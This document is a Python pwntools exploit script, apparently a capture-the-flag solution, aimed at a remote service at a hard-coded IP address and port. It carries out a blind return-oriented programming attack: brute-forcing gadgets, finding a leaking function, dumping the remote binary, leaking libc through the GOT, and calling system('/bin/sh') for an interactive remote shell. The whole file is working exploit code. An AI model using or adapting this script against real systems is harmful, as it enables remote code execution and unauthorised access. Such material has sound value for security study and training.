#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 35.246.134.224 --port 30764
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
libc = ELF('libc-2.23.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '35.246.134.224'
port = int(args.PORT or 30764)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# LEAK MAIN

'''
addr = 0x4006b6

while True:
    print("*** TRYING {} ***".format(hex(addr)))
    io = start()
    payload = flat({
        0x58: addr,
        })
    io.sendlineafter(b"Are you blind my friend?\n", payload)

    try:
        res = io.recvline(timeout=4)
        if b"Are you blind my friend?\n" in res:
            print(hex(addr))
            break
    except:
        io.close()

    addr += 1
'''
stop = 0x4006b6



# LEAK BROP

'''
addr = 0x4007ba

while True:
    print("*** TRYING {} ***".format(hex(addr)))
    io = start()
    payload = flat({
        0x58: [
            addr,
            0,
            0,
            0,
            0,
            0,
            0,
            stop,
            stop,
            ],
        })
    io.sendlineafter(b"Are you blind my friend?\n", payload)

    try:
        res = io.recvuntil(b"Are you blind my friend?\n", timeout=4)
        if len(res) != 0:
            io.sendline(b'a')
            io.recvuntil(b"No password for you!\n")
            res = io.recv(1, timeout=4)
            print(hex(addr))
            break
        else:
            io.close()
    except:
        io.close()

    addr += 1
'''
brop = 0x4007ba



# FIND LEAKING FUNCTION

'''
addr = 0x4006fb

while True:
    print("*** TRYING {} ***".format(hex(addr)))
    io = start()
    payload = flat({
        0x58: [
            brop+9,
            0x400000,
            addr,
            ],
        })
    io.sendlineafter(b"Are you blind my friend?\n", payload)

    try:
        res = io.recv(4, timeout=4)
        if b'ELF' in res:
            print(io.recvline())
            print(hex(addr))
            break
        else:
            io.close()
    except:
        io.close()

    addr += 1
'''

leak_func = 0x4006fb



# DUMP BINARY

'''
current_addr = 0x400000

f = open('vuln', 'wb')
while True:
    print("*** READING {} ***".format(hex(current_addr)))
    io = start()
    payload = flat({
        0x58: [
            brop+9,
            current_addr,
            leak_func,
            ],
        })
    io.sendlineafter(b"Are you blind my friend?\n", payload)

    try:
        res = io.recv(timeout=4)
        current_addr += len(res)
        res = res[:-1] + b'\x00'
        print(res)
        f.write(res)
        io.close()
    except:
        io.close()
        break
f.close()
'''
read_got = 0x601028



# RET2LIBC

io = start()
payload = flat({
    0x58: [
        brop+9,
        read_got,
        leak_func,
        stop,
        ],
    })

io.sendlineafter(b"Are you blind my friend?\n", payload)

leak = io.recvuntil(b'\n', drop=True)
libc.address = unpack(leak.ljust(8, b'\x00')) - libc.sym['read']
io.success("LIBC : " + hex(libc.address))

payload = flat({
    0x58: [
        brop+9,
        next(libc.search(b'/bin/sh')),
        libc.sym['system'],
        ],
    })

io.sendline(payload)

io.interactive()
